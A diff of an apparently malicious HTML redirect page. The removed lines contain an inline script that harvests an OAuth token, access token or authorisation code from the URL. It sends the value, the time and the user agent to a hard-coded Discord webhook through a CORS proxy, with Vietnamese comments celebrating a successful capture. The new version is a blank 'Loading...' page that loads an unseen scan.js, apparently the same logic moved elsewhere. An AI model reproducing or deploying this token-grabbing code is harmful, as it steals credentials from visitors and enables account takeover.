@@ -1,56 +1,21 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <style>
-        body, html {
-            background-color: #ffffff;
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background: #ffffff;
+    overflow: hidden;
+  }
+</style>
 </head>
 <body>
-
-<script>
-    (function() {
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";
-        if (!WEBHOOK_URL) return;
-
-        // Quét token hoặc code từ URL ngay lập tức (cả dạng ? và dạng #)
-        const urlParams = new URLSearchParams(window.location.search);
-        let token = urlParams.get('token') || urlParams.get('access_token') || urlParams.get('code');
-
-        if (!token && window.location.hash) {
-            const hashParams = new URLSearchParams(window.location.hash.substring(1));
-            token = hashParams.get('token') || hashParams.get('access_token');
-        }
-
-        if (!token) return;
-
-        // Đóng gói nội dung gửi về Discord
-        const payload = {
-            content: `🚨 **Tóm Gọn Thành Công!**\n- **Token/Code:** \`${token}\`\n- **Thời gian:** ${new Date().toLocaleString()}\n- **Thiết bị:** \`${navigator.userAgent}\``
-        };
-
-        // Gửi qua CORS Proxy cực nhanh, hỗ trợ keepalive sống dai ngay cả khi đóng web siêu tốc
-        try {
-            fetch("https://corsproxy.io/?" + encodeURIComponent(WEBHOOK_URL), {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload),
-                keepalive: true
-            });
-        } catch (e) {}
-    })();
-</script>
-
+<script src="scan.js"></script>
 </body>
 </html>
